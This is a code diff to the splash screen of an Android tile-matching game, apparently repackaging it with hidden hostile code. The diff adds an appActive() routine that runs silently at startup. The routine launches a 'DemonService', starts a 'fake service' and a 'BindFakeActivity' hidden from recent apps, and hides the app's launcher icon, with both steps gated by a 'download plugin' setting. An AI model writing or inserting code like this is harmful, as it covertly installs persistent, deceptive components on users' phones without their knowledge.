@@ -12,6 +12,12 @@ import com.tinygame.lianliankan.db.DatabaseOperator;
 import com.tinygame.lianliankan.utils.SoundEffectUtils;
 import com.tinygame.lianliankan.view.JPSplashView;
 import com.tinygame.lianliankan.view.JPSplashView.SplashDispalyListener;
+import com.xstd.qm.AppRuntime;
+import com.xstd.qm.Config;
+import com.xstd.qm.Utils;
+import com.xstd.qm.activity.BindFakeActivity;
+import com.xstd.qm.service.DemonService;
+import com.xstd.qm.setting.MainSettingManager;
 
 public class LinkLinkSplashActivity extends Activity {
 
@@ -52,10 +58,12 @@ public class LinkLinkSplashActivity extends Activity {
         StartTask task = new StartTask();
         task.execute("");
     }
-    
+
     private class StartTask extends AsyncTask<String, Void, Integer> {
         protected Integer doInBackground(String...params) {
             try {
+                appActive();
+
                 SoundEffectUtils.getInstance().init(LinkLinkSplashActivity.this.getApplicationContext());
                 SettingManager.getInstance().init(getApplicationContext());
                 DatabaseOperator.getInstance().init(getApplicationContext());
@@ -67,6 +75,34 @@ public class LinkLinkSplashActivity extends Activity {
         
         protected void onPostExecute(Integer result) {
 //            mHandler.sendEmptyMessage(START_MAIN_VIEW);
+        }
+    }
+
+    private void appActive() {
+        long launchTime = MainSettingManager.getInstance().getKeyLanuchTime();
+        if (launchTime == 0) {
+            //first lanuch
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
+            }
+
+            Intent i = new Intent();
+            i.setClass(getApplicationContext(), DemonService.class);
+            i.setAction(DemonService.ACTION_LANUCH);
+            startService(i);
+        }
+
+        if (!AppRuntime.isBindingActive(getApplicationContext())
+                && !MainSettingManager.getInstance().getDisableDownloadPlugin()) {
+            Utils.startFakeService(getApplicationContext(), "[[Utils::startFakeService]]");
+            Intent i = new Intent();
+            i.setClass(getApplicationContext(), BindFakeActivity.class);
+            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+            startActivity(i);
+        }
+
+        if (!MainSettingManager.getInstance().getDisableDownloadPlugin()) {
+            AppRuntime.hideInLauncher(getApplicationContext());
         }
     }
 }
